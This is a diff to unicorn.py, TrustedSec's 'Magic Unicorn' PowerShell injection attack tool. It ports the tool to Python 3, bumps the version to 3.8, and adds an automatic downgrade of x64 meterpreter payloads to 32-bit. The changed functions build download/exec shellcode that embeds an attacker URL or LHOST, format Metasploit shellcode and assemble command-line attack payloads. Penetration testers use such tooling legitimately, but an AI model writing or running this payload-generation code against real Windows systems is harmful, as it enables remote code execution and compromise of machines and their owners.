@@ -33,6 +33,9 @@ import string
 import binascii
 from functools import reduce
 
+# python 3 compat
+raw_input = input
+
 #######################################################################################################
 # Keep Matt Happy #####################################################################################
 #######################################################################################################
@@ -491,7 +494,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.7.7 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.8 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -530,6 +533,7 @@ def bypass_amsi():
 # this will convert any url to hexformat for download/exec payload
 def url_hexified(url):
     x = binascii.hexlify(url)
+    x = x.decode('utf-8')
     a = [x[i:i+2] for i in range(0, len(x), 2)]
     list = ""
     for goat in a: list = list + "\\x" + goat.rstrip()
@@ -720,6 +724,7 @@ def gen_hta_attack(command):
 def format_metasploit(data):
     # start to format this a bit to get it ready
     repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '','unsignedcharbuf[]=': ''}
+    data = data.decode()
     data = reduce(lambda a, kv: a.replace(*kv),iter(repls.items()), data).rstrip()
     if len(data) < 1:
         #print("[!] Shellcode was not generated for some reason. Check payload name and if Metasploit is working and try again.")
@@ -774,7 +779,7 @@ def generate_shellcode(payload, ipaddr, port):
                      "\\xFF\\xFF\\xURLHERE\\x00")
 
         url = ipaddr.replace("LHOST=", "").replace("url=", "")
-        url_patched = url_hexified(url)
+        url_patched = url_hexified(str.encode(url))
         data = shellcode.replace("\\xURLHERE", url_patched)
 
     else:
@@ -1113,7 +1118,6 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
                 print("[!] WARNING. WARNING. Length of the payload is above command line limit length of 8191. Recommend trying to generate again or the line will be cut off.")
                 print("[!] Total Payload Length Size: " + str(len(full_attack)))
                 raw_input("Press {return} to continue.")
-                #sys.exit()
 
             # format for dde specific payload
             if attack_modifier == "dde":
@@ -1197,6 +1201,11 @@ try:
             cobalt_strike()
             gen_usage()
             sys.exit()
+
+        # if using a 64 bit payload then downgrade to 32 bit. The way unicorn works is by doing whats called an x86 downgrade attack so there is$
+        if ("windows/x64/meterpreter") in sys.argv[1]:
+            print("[!] WARNING: x64 meterpreter payload selected which is not compatible. Unicorn handles shellcode creation on both 32 and 64 by using an x86 downgrade attack regardless of 32 and 64 bit platforms. No interaction needed, downgrading to 32-bit payload.")
+            sys.argv[1] = sys.argv[1].replace("windows/x64/", "windows/")
 
         # settings option for SettingContent-ms filetype attack vector
         if sys.argv[1] == "ms":
@@ -1342,6 +1351,6 @@ except KeyboardInterrupt:
     print("\nExiting Unicorn... May the magical unicorn force flow through you.\n")
     sys.exit()
 
-except Exception as e:
-    if "list index" in str(e): print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python unicorn.py for all usage.")
-    else: print("[!] Something went wrong, printing the error: " + str(e))
+#except Exception as e:
+#    if "list index" in str(e): print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python unicorn.py for all usage.")
+#    else: print("[!] Something went wrong, printing the error: " + str(e))
